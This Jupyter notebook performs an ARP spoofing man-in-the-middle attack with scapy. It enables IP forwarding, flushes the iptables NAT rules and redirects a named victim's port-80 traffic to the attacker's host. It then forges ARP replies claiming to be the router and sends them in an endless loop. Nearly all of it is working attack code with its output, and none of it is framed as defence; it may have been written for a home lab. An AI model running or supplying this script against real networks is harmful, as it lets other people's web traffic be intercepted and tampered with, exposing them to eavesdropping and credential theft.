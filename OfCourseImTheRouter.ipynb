{
 "metadata": {
  "name": ""
 },
 "nbformat": 3,
 "nbformat_minor": 0,
 "worksheets": [
  {
   "cells": [
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "from scapy.all import *\n",
      "import os\n",
      "import time\n",
      "from ipInfo import *"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stderr",
       "text": [
        "WARNING: No route found for IPv6 destination :: (no default route?)\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stderr",
       "text": [
        "WARNING:scapy.runtime:No route found for IPv6 destination :: (no default route?)\n"
       ]
      }
     ],
     "prompt_number": 1
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "#Ip Addresses etc. from my ipInfo helper module\n",
      "printIpInfo()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "interface : eth0                \n",
        "victimIp  : 192.168.1.101       \n",
        "routerIp  : 192.168.1.1         \n",
        "myIp      : 192.168.1.102       \n"
       ]
      }
     ],
     "prompt_number": 2
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "#turn on IP port forwarding so we can behave like a router\n",
      "#and get our NIC to accept packets not addressed to us\n",
      "os.system(\"echo 1 > /proc/sys/net/ipv4/ip_forward\")\n",
      "\n",
      "#re-route traffic to our local tcp server\n",
      "os.system(\"/sbin/iptables -t nat -F\") #clear existing rules\n",
      "os.system(\"/sbin/iptables -t nat -A PREROUTING -p tcp -s \"+victimIp+\" --dport 80 -j DNAT --to-destination \" + myIp)\n",
      "\n",
      "#disallow ICMP redirects\n",
      "#this keeps TCP/IP from picking a better route than through\n",
      "#the attack machine\n",
      "#os.system(\"echo 0 > /proc/sys/net/ipv4/conf/\"+interface+\"/send_redirects\")"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 3,
       "text": [
        "0"
       ]
      }
     ],
     "prompt_number": 3
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "#Build the ARP packet to be sent to the victim\n",
      "#saying I am the router\n",
      "victimPacket = ARP()\n",
      "victimPacket.psrc = routerIp\n",
      "victimPacket.pdst = victimIp\n",
      "victimPacket.hwsrc = get_if_hwaddr(interface)\n",
      "victimPacket.hwdst = 'ff:ff:ff:ff:ff:ff'\n",
      "victimPacket.op = 1 # arp request (who-has)\n",
      "\n",
      "victimPacket.display()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "###[ ARP ]###\n",
        "  hwtype    = 0x1\n",
        "  ptype     = 0x800\n",
        "  hwlen     = 6\n",
        "  plen      = 4\n",
        "  op        = who-has\n",
        "  hwsrc     = ba:db:ee:f1:23:45\n",
        "  psrc      = 192.168.1.1\n",
        "  hwdst     = ff:ff:ff:ff:ff:ff\n",
        "  pdst      = 192.168.1.101\n"
       ]
      }
     ],
     "prompt_number": 4
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "send(victimPacket)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n",
        "Sent 1 packets.\n"
       ]
      }
     ],
     "prompt_number": 5
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "#Build the ARP packet to be sent to the router\n",
      "#saying send the victim's traffic to me\n",
      "#routerPacket = ARP()\n",
      "#routerPacket.psrc = victimIp\n",
      "#routerPacket.pdst = routerIp\n",
      "#routerPacket.hwsrc = get_if_hwaddr(interface)\n",
      "#routerPacket.hwdst = 'ff:ff:ff:ff:ff:ff'\n",
      "#routerPacket.op = 1 # arp request (who-has)\n",
      "\n",
      "#routerPacket.display()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 6
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "#send(routerPacket)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 7
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "while(1):\n",
      "    send(victimPacket,verbose=0)\n",
      "#    send(routerPacket,verbose=0)\n",
      "    time.sleep(.5) # wait for 1 second"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": "*"
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": "*"
    }
   ],
   "metadata": {}
  }
 ]
}